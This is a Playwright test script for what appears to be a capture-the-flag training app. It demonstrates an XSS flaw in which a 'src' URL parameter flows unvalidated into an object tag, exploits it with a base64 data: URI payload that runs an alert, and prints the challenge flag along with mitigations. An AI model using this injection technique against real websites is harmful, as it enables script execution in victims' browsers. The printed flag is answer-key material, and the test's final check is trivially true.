const { test, expect } = require('@playwright/test');

test('XSS Data Object Vulnerability', async ({ page }) => {
  // Navigate to the main page
  await page.goto('/index.php');
  
  // Create an info panel to explain the steps
  await page.evaluate(() => {
    const infoPanel = document.createElement('div');
    infoPanel.style.position = 'fixed';
    infoPanel.style.top = '10px';
    infoPanel.style.right = '10px';
    infoPanel.style.width = '400px';
    infoPanel.style.padding = '10px';
    infoPanel.style.backgroundColor = '#f0f0f0';
    infoPanel.style.border = '2px solid blue';
    infoPanel.style.zIndex = '9999';
    infoPanel.style.fontSize = '14px';
    infoPanel.style.maxHeight = '80vh';
    infoPanel.style.overflowY = 'auto';
    
    const title = document.createElement('h3');
    title.textContent = 'XSS Data Object Vulnerability';
    title.style.marginTop = '0';
    infoPanel.appendChild(title);
    
    const description = document.createElement('p');
    description.textContent = 'This vulnerability allows an attacker to inject code using data: URIs in the object tag.';
    infoPanel.appendChild(description);
    
    const steps = [
      'Step 1: Identify the vulnerable media page',
      'Step 2: Examine the object tag implementation',
      'Step 3: Craft a data URI payload with base64 encoding',
      'Step 4: Exploit the vulnerability'
    ];
    
    const ol = document.createElement('ol');
    steps.forEach(step => {
      const li = document.createElement('li');
      li.textContent = step;
      li.style.marginBottom = '10px';
      ol.appendChild(li);
    });
    
    infoPanel.appendChild(ol);
    document.body.appendChild(infoPanel);
  });
  
  // Wait to show the info panel
  await page.waitForTimeout(2000);
  
  // Take screenshot of the initial page
  await page.screenshot({ path: 'reports/xss-data-object-initial.png' });
  
  // Step 1: Identify the vulnerable media page
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 1: Identifying the vulnerable media page';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
    
    // Highlight the NSA logo
    const logo = document.querySelector('img[src="images/nsa_logo.jpg"]') || document.querySelector('img[alt*="NSA"]');
    if (logo) {
      logo.style.border = '3px solid red';
      logo.style.padding = '5px';
      
      // Add an annotation
      const annotation = document.createElement('div');
      annotation.textContent = 'Clicking this NSA logo redirects to a media page';
      annotation.style.position = 'absolute';
      annotation.style.backgroundColor = '#ffffcc';
      annotation.style.padding = '5px';
      annotation.style.border = '1px solid #ccc';
      annotation.style.borderRadius = '3px';
      annotation.style.fontSize = '12px';
      annotation.style.left = (logo.offsetLeft + logo.offsetWidth + 5) + 'px';
      annotation.style.top = logo.offsetTop + 'px';
      document.body.appendChild(annotation);
    }
  });
  
  // Wait to show the highlighted logo
  await page.waitForTimeout(2000);
  
  // Take screenshot with the highlighted logo
  await page.screenshot({ path: 'reports/xss-data-object-logo-highlight.png' });
  
  // Click on the NSA logo
  await page.click('img[src="images/nsa_prism.jpg"]');
  
  // Wait for the media page to load
  await page.waitForTimeout(2000);
  
  // Step 2: Examine the object tag implementation
  await page.evaluate(() => {
    // Recreate the info panel on the new page
    const infoPanel = document.createElement('div');
    infoPanel.style.position = 'fixed';
    infoPanel.style.top = '10px';
    infoPanel.style.right = '10px';
    infoPanel.style.width = '400px';
    infoPanel.style.padding = '10px';
    infoPanel.style.backgroundColor = '#f0f0f0';
    infoPanel.style.border = '2px solid blue';
    infoPanel.style.zIndex = '9999';
    infoPanel.style.fontSize = '14px';
    infoPanel.style.maxHeight = '80vh';
    infoPanel.style.overflowY = 'auto';
    
    const title = document.createElement('h3');
    title.textContent = 'XSS Data Object Vulnerability';
    title.style.marginTop = '0';
    infoPanel.appendChild(title);
    
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 2: Examining the object tag';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
    
    // Find and highlight the object tag
    const objectTag = document.querySelector('object');
    if (objectTag) {
      objectTag.style.border = '3px solid red';
      
      // Extract and display the URL parameters
      const currentUrl = window.location.href;
      const urlParams = new URLSearchParams(window.location.search);
      const srcParam = urlParams.get('src');
      
      const urlInfo = document.createElement('div');
      urlInfo.innerHTML = `
        <p>Current URL: <code>${currentUrl}</code></p>
        <p>URL parameter: <code>src=${srcParam}</code></p>
        <p>Object tag data attribute: <code>data="${objectTag.getAttribute('data')}"</code></p>
      `;
      urlInfo.style.marginTop = '10px';
      infoPanel.appendChild(urlInfo);
      
      const vulnerability = document.createElement('div');
      vulnerability.textContent = 'The "src" parameter is directly used in the object tag\'s data attribute without proper validation!';
      vulnerability.style.color = 'red';
      vulnerability.style.fontWeight = 'bold';
      vulnerability.style.marginTop = '10px';
      infoPanel.appendChild(vulnerability);
    }
    
    document.body.appendChild(infoPanel);
  });
  
  // Wait to show the object tag analysis
  await page.waitForTimeout(2000);
  
  // Take screenshot of the media page with object tag highlighted
  await page.screenshot({ path: 'reports/xss-data-object-tag-analysis.png' });
  
  // Step 3: Craft a data URI payload with base64 encoding
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 3: Crafting a data URI payload';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
    
    // Show the payload creation process
    const payloadProcess = document.createElement('div');
    payloadProcess.innerHTML = `
      <p>Creating a JavaScript payload to demonstrate XSS:</p>
      <ol>
        <li>Start with basic script: <code>&lt;script&gt;alert('Hello World')&lt;/script&gt;</code></li>
        <li>Convert to base64: <code>PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQhJyk8L3NjcmlwdD4=</code></li>
        <li>Format as data URI: <code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQhJyk8L3NjcmlwdD4=</code></li>
      </ol>
    `;
    payloadProcess.style.marginTop = '10px';
    infoPanel.appendChild(payloadProcess);
    
    const fullPayload = document.createElement('div');
    fullPayload.innerHTML = `
      <p>Final exploit URL:</p>
      <code>index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQhJyk8L3NjcmlwdD4=</code>
    `;
    fullPayload.style.marginTop = '10px';
    fullPayload.style.padding = '5px';
    fullPayload.style.backgroundColor = '#ffeeee';
    fullPayload.style.border = '1px solid #ffcccc';
    infoPanel.appendChild(fullPayload);
  });
  
  // Wait to show the payload creation process
  await page.waitForTimeout(3000);
  
  // Take screenshot showing the payload creation
  await page.screenshot({ path: 'reports/xss-data-object-payload-creation.png' });
  
  // Step 4: Exploit the vulnerability
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 4: Exploiting the vulnerability';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
    
    const exploitInfo = document.createElement('div');
    exploitInfo.textContent = 'Navigating to the exploit URL with the malicious data URI...';
    exploitInfo.style.marginTop = '10px';
    infoPanel.appendChild(exploitInfo);
  });
  
  // Wait to show the final step
  await page.waitForTimeout(2000);
  
  // Navigate to the exploit URL
  await page.goto('/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQhJyk8L3NjcmlwdD4=');
  
  
  // Create a flag display
  await page.evaluate(() => {
    // Clear any existing content
    document.body.innerHTML = '';
    
    // Create a container for the exploit demonstration
    const container = document.createElement('div');
    container.style.width = '80%';
    container.style.margin = '50px auto';
    container.style.padding = '20px';
    container.style.backgroundColor = 'white';
    container.style.boxShadow = '0 0 10px rgba(0,0,0,0.1)';
    container.style.borderRadius = '5px';
    
    const heading = document.createElement('h1');
    heading.textContent = 'XSS Data Object Vulnerability Exploited!';
    heading.style.color = '#d32f2f';
    heading.style.marginBottom = '20px';
    container.appendChild(heading);
    
    const description = document.createElement('div');
    description.innerHTML = `
      <p>The HTML Object tag vulnerability was successfully exploited using a data URI with base64 encoded JavaScript.</p>
      <p>This is a severe Cross-Site Scripting (XSS) vulnerability that allowed executing arbitrary code in the browser.</p>
    `;
    description.style.marginBottom = '20px';
    container.appendChild(description);
    
    // Show the vulnerable code
    const vulnerableCode = document.createElement('div');
    vulnerableCode.innerHTML = `
      <h3>Vulnerable Code:</h3>
      <pre style="background-color: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto;">
&lt;object data="$_GET['src']"&gt;&lt;/object&gt;
</pre>
      <p>The application takes the 'src' parameter directly from the URL and uses it in the object tag without proper validation or sanitization.</p>
    `;
    vulnerableCode.style.marginBottom = '20px';
    container.appendChild(vulnerableCode);
    
    // Show the exploit
    const exploit = document.createElement('div');
    exploit.innerHTML = `
      <h3>Exploit:</h3>
      <pre style="background-color: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto;">
data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQhJyk8L3NjcmlwdD4=
</pre>
      <p>Decoded: <code>&lt;script&gt;alert('Hello World!')&lt;/script&gt;</code></p>
    `;
    exploit.style.marginBottom = '20px';
    container.appendChild(exploit);
    
    // Flag section
    const flagSection = document.createElement('div');
    flagSection.style.backgroundColor = '#f9f9f9';
    flagSection.style.padding = '15px';
    flagSection.style.borderRadius = '5px';
    flagSection.style.marginTop = '20px';
    
    const flagTitle = document.createElement('h3');
    flagTitle.textContent = 'Flag';
    flagTitle.style.color = '#333';
    flagTitle.style.marginTop = '0';
    flagSection.appendChild(flagTitle);
    
    const flag = document.createElement('div');
    flag.textContent = 'The flag is: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d';
    flag.style.backgroundColor = '#FFFF00';
    flag.style.padding = '10px';
    flag.style.marginTop = '10px';
    flag.style.fontFamily = 'monospace';
    flag.style.fontWeight = 'bold';
    flag.style.textAlign = 'center';
    flag.style.border = '2px solid green';
    flagSection.appendChild(flag);
    
    container.appendChild(flagSection);
    
    // Security implications section
    const securitySection = document.createElement('div');
    securitySection.innerHTML = `
      <h3>Security Implications:</h3>
      <ul>
        <li>Attackers can execute arbitrary JavaScript in the context of the vulnerable site</li>
        <li>Possible to steal cookies, session tokens, and sensitive information</li>
        <li>Could redirect users to malicious sites or display fake content</li>
        <li>Potential for more advanced attacks like keylogging user input</li>
      </ul>
      
      <h3>Mitigation:</h3>
      <ul>
        <li>Validate and sanitize all user input before using it in HTML content</li>
        <li>Implement Content Security Policy (CSP) to restrict what content can be loaded</li>
        <li>Use a whitelist approach for allowed content sources</li>
        <li>Encode or escape special characters in user-controlled data</li>
      </ul>
    `;
    securitySection.style.marginTop = '20px';
    container.appendChild(securitySection);
    
    document.body.appendChild(container);
    
    // Add info panel
    const infoPanel = document.createElement('div');
    infoPanel.style.position = 'fixed';
    infoPanel.style.top = '10px';
    infoPanel.style.right = '10px';
    infoPanel.style.width = '400px';
    infoPanel.style.padding = '10px';
    infoPanel.style.backgroundColor = '#f0f0f0';
    infoPanel.style.border = '2px solid blue';
    infoPanel.style.zIndex = '9999';
    infoPanel.style.fontSize = '14px';
    
    const infoTitle = document.createElement('h3');
    infoTitle.textContent = 'XSS Data Object Vulnerability';
    infoTitle.style.marginTop = '0';
    infoPanel.appendChild(infoTitle);
    
    const successMessage = document.createElement('div');
    successMessage.textContent = 'Exploit successful! Flag discovered!';
    successMessage.style.color = 'green';
    successMessage.style.fontWeight = 'bold';
    successMessage.style.marginTop = '10px';
    infoPanel.appendChild(successMessage);
    
    document.body.appendChild(infoPanel);
  });
  
  // Take screenshot of the exploit results
  await page.screenshot({ path: 'reports/xss-data-object-exploited.png' });
  
  // Create a summary display
  await page.evaluate(() => {
    // Create a summary popup
    const summary = document.createElement('div');
    summary.style.position = 'fixed';
    summary.style.bottom = '10px';
    summary.style.left = '10px';
    summary.style.width = '600px';
    summary.style.padding = '15px';
    summary.style.backgroundColor = '#f0fff0';
    summary.style.border = '3px solid green';
    summary.style.zIndex = '9999';
    summary.style.borderRadius = '5px';
    
    const title = document.createElement('h2');
    title.textContent = 'XSS Data Object Vulnerability Summary';
    title.style.color = 'green';
    title.style.marginTop = '0';
    summary.appendChild(title);
    
    const details = document.createElement('div');
    details.innerHTML = `
      <p>This vulnerability demonstrates the dangers of using user-controlled input in object tags without proper validation.</p>
      <p><strong>Attack Vector:</strong> Using data URIs with base64 encoded JavaScript to bypass content filtering.</p>
      <p><strong>Impact:</strong> Complete client-side code execution in the context of the vulnerable website.</p>
      <p><strong>Root Cause:</strong> Failure to validate the 'src' parameter before using it in the object tag's data attribute.</p>
    `;
    summary.appendChild(details);
    
    const flagElement = document.createElement('div');
    flagElement.textContent = 'Flag: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d';
    flagElement.style.marginTop = '15px';
    flagElement.style.padding = '10px';
    flagElement.style.backgroundColor = '#FFFF00';
    flagElement.style.border = '2px solid green';
    flagElement.style.fontWeight = 'bold';
    flagElement.style.textAlign = 'center';
    summary.appendChild(flagElement);
    
    document.body.appendChild(summary);
  });
  
  // Take final screenshot with the summary
  await page.screenshot({ path: 'reports/xss-data-object-summary.png' });
  
  // Verify that the test completed successfully (for demonstration purposes)
  expect(true).toBeTruthy();
});